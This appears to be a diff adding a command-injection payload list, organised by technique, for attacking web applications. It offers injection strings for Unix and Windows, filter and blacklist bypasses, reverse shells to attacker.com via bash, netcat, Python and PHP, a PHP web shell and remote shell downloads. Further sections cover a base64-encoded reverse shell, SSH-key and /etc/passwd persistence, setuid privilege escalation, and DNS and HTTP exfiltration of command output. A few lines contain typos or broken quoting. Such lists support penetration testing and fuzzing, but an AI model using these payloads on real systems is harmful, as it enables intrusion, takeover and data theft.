@@ -1,0 +1,229 @@
+# Command Injection Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: Command Injection
+
+# ============================================
+# BASIC COMMAND INJECTION
+# ============================================
+
+;id
+|id
+&id
+`id`
+$(id)
+%0aid
+%0Aid
+
+;whoami
+|whoami
+&whoami
+`whoami`
+$(whoami)
+
+;ls
+|ls
+&ls
+`ls`
+$(ls)
+
+;cat /etc/passwd
+|car /etc/passwd
+&cat /etc/passwd
+`cat /etc/passwd`
+
+# ============================================
+# WINDOWS COMMAND INJECTION
+# ============================================
+
+;dir
+|dir
+&dir
+type C:\Windows\win.ini
+type C:\boot.ini
+\\localhost\c$\windows\system32\cmd.exe
+net user
+net localgroup administrators
+
+# ============================================
+# BYPASSING SPACE FILTERS
+# ============================================
+
+;cat/etc/passwd
+;cat$IFS/etc/passwd
+;cat</etc/passwd
+;{cat,/etc/passwd}
+;cat%09/etc/passwd
+;cat${IFS}/etc/passwd
+;cat%20/etc/passwd
+
+# ============================================
+# BYPASSING RESTRICTIONS
+# ============================================
+
+;echo%20test
+;printf%20test
+;test
+%0aecho test
+%0acat /etc/passwd
+\ncat /etc/passwd
+\tcat /etc/passwd
+
+# ============================================
+# CHAINING COMMANDS
+# ============================================
+
+;id;ls
+;id|ls
+;id&ls
+;id&&ls
+;id||ls
+;id|whoami
+;ls -la;id
+;cat /etc/passwd;whoami
+
+# ============================================
+# REVERSE SHELL
+# ============================================
+
+;bash -i>& /dev/tcp/attacker.com/4444 0>&1
+;nc -e /bin/sh attacker.com 4444
+;python -c 'import socket,subprocess,os;s=socket.socket()
+s.connect(("attacker.com",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])'
+;php -r '$s=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");"
+
+# ============================================
+# FILE WRITING
+# ============================================
+
+;echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
+;wget http://attacker.com/shell.txt -O shell.php
+;curl http://attacker.com/shell.txt -o shell.php
+
+# ============================================
+# INFORMATION GATHERING
+# ============================================
+
+;uname -a
+;cat /etc/os-release
+;id
+;whoami
+;hostname
+;env
+;printenv
+;ls -la /var/www
+;ls -la /home
+
+# ============================================
+# PATH TRAVERSAL + COMMANDS
+# ============================================
+
+;../../../../../../../etc/passwd
+;../../../../../../../bin/ls
+;..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+
+# ============================================
+# ENVIRONMENT VARIABLES
+# ============================================
+
+;${HOME}
+;${PATH}
+;${USER}
+;${SHELL}
+;${IFS}
+;$HOME
+;$PATH
+
+# ============================================
+# BASE64 ENCODED
+# ============================================
+
+;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx | base64 -d | bash
+;echo aWQ= | base64 -d
+
+# ============================================
+# TIME DELAY
+# ============================================
+
+;sleep 5
+;ping -c 5 127.0.0.1
+;timeout 5
+
+# ============================================
+# BYPASSING BLACKLIST
+# ============================================
+
+;cat /e'tc/passwd
+;c""at /etc/passwd
+;c\at /etc/passwd
+;/bin/cat /etc/passwd
+;/usr/bin/cat /etc/passwd
+;cat /etc$IFS/passwd
+
+# ============================================
+# NULL BYTE INJECTION
+# ============================================
+
+;cat%00/etc/passwd
+;cat /etc/passwd%00
+
+# ============================================
+# QUOTES BYPASS
+# ============================================
+
+;cat "/etc/passwd"
+;cat '/etc/passwd'
+;cat /etc/pa''sswd
+;cat /etc/pa""sswd
+
+# ============================================
+# NEWLINES AND TABS
+# ============================================
+
+;cat /etc/passwd%0A
+;cat /etc/passwd%09
+;cat%0A/etc/passwd
+
+# ============================================
+# COMMAND SUBSTITUTION
+# ============================================
+
+$(cat /etc/passwd)
+`cat /etc/passwd`
+$(whoami)
+`whoami`
+${IFS}
+
+# ============================================
+# PERSISTENT SHELL
+# ============================================
+
+;ssh-keygen -t rsa -C "attacker"
+;echo "ssh-rsa AAAAB3..." >> /root/.ssh/authorized_keys
+;echo "attacker" | tee -a /etc/passwd
+
+# ============================================
+# PRIVILEGE ESCALATION
+# ============================================
+
+;sudo -l
+;chmod +s /bin/bash
+;chmod 4777 /bin/sh
+
+# ============================================
+# DNS EXFILTRATION
+# ============================================
+
+;nslookup $(whoami).attacker.com
+;ping -c 1 $(whoami).attacker.com
+
+# ============================================
+# CURL/WGET TO EXFILTRATE
+# ============================================
+
+;curl http://attacker.com/?data=$(id)
+;wget http://attacker.com/?data=$(id)
+
